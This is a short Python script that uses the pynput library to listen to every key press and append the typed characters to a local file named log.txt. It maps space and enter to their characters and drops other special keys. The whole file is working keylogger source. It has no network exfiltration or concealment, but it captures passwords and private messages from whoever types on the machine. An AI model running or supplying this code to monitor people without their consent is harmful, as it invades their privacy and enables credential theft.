from pynput.keyboard import Listener

def write_to_file(key):
    letter = str(key)
    letter=letter.replace("'", "") # Remove surrounding single quotes

    if letter == "Key.space":
        letter = " "
    if letter == "Key.enter":
        letter = "\n"
    if "Key" in letter:  # Optional: skip other special keys
        letter = ""

    with open("log.txt", 'a') as f:
        f.write(letter)

with Listener(on_press=write_to_file) as l:
    l.join()